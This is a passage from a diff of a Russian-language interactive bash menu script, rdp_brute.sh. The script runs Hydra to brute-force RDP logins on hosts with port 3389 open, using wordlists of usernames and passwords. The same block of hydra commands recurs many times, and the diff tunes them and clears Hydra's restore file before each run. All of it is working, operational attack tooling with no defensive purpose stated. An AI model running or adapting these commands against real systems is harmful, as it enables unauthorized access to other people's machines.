 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -8576,7 +9048,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -8585,7 +9057,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -8614,6 +9086,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -8625,7 +9101,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -8635,7 +9111,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -8645,7 +9121,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -8654,7 +9130,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -8683,6 +9159,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -8694,7 +9174,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -8704,7 +9184,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -8714,7 +9194,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -8723,7 +9203,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -8752,6 +9232,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -8763,7 +9247,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -8773,7 +9257,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -8783,7 +9267,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -8792,7 +9276,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -8821,6 +9305,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -8832,7 +9320,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -8842,7 +9330,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -8852,7 +9340,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -8861,7 +9349,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -8890,6 +9378,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -8901,7 +9393,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -8911,7 +9403,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -8921,7 +9413,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -8930,7 +9422,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -8959,6 +9451,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -8970,7 +9466,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -8980,7 +9476,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -8990,7 +9486,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -8999,7 +9495,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -9027,6 +9523,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -9038,7 +9538,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -9048,7 +9548,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -9058,7 +9558,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -9067,7 +9567,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -9096,6 +9596,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -9107,7 +9611,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -9117,7 +9621,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -9127,7 +9631,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -9136,7 +9640,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -9165,6 +9669,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -9176,7 +9684,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -9186,7 +9694,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -9196,7 +9704,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -9205,7 +9713,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -9234,6 +9742,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -9245,7 +9757,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -9255,7 +9767,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -9265,7 +9777,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -9274,7 +9786,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -9303,6 +9815,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -9314,7 +9830,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -9324,7 +9840,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -9334,7 +9850,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -9343,7 +9859,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -9372,6 +9888,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -9383,7 +9903,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -9393,7 +9913,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -9403,7 +9923,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
